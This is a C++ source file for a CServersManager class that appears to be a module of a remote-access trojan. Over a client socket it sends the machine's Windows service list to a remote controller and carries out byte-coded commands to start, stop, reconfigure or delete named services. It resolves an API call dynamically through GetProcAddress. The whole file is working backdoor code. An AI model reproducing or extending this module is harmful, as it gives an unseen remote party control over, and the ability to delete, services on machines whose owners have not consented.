// ServersManager.cpp: implementation of the CServersManager class.
//
//////////////////////////////////////////////////////////////////////

#include "ServersManager.h"
#include "ServersManagement.h"
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CServersManager::CServersManager(CClientSocket *pClient) : CManager(pClient)
{
    SendServerInfo();
}

CServersManager::~CServersManager()
{

}
typedef SIZE_T (WINAPI *LocalSizeT)
(
    __in HLOCAL hMem
    );

void CServersManager::SendServerInfo()
{
	LocalSizeT pLocalSize= (LocalSizeT)GetProcAddress(LoadLibrary("kernel32.dll"),"LocalSize");

	DWORD count;
	ServersManagement sermg;
    LPBYTE lpBuffer=sermg.GetServices(count);
	Send((LPBYTE)lpBuffer, pLocalSize(lpBuffer));
	LocalFree(lpBuffer);
}
 

void CServersManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0]){
	case COMMAND_SERVERS_INFO:            //刷新列表
         SendServerInfo();
	   break;
    case COMMAND_SERVERS_START:        //启动指定服务
          StartSer(lpBuffer+1);
		break;
	case COMMAND_SERVERS_STOP:            //停止指定服务
		StopSer(lpBuffer+1);
		break;
    case COMMAND_SERVERS_SETOPT:           //设置服务项
       SetOpt((char*)(lpBuffer+1));
		break;
	case COMMAND_SERVERS_DEL:             //删除指定服务
		 DelSer((char*)(lpBuffer+1));
		break;
	   default:
		break;
	}

}
//启动服务
void CServersManager::StartSer(BYTE *name)
{
    ServersManagement sermg;
	if(sermg.StartSrv((char*)name)){         //TOKEN_SERVERS_OK
	      BYTE bToken=TOKEN_SERVERS_OK;
		  Send((BYTE*)&bToken,1);
	}
}
//停止服务
void CServersManager::StopSer(BYTE *name)
{
	ServersManagement sermg;
	if(sermg.StopSrv((char*)name)){         //TOKEN_SERVERS_OK
	      BYTE bToken=TOKEN_SERVERS_OK;
		  Send((BYTE*)&bToken,1);
	}
    
}
//设置服务项
void CServersManager::SetOpt(char *info)
{  
    
  ServersManagement sermg;
  BOOL b=info[0];
  char *name=info+1;
	if(sermg.SetOpt(name,b)){         //TOKEN_SERVERS_OK
	      BYTE bToken=TOKEN_SERVERS_OK;
		  Send((BYTE*)&bToken,1);
	}
}

void CServersManager::DelSer(char *name)
{
    ServersManagement sermg;
	if(sermg.DelSer((char*)name)){         //TOKEN_SERVERS_OK
	      BYTE bToken=TOKEN_SERVERS_OK;
		  Send((BYTE*)&bToken,1);
	}
}
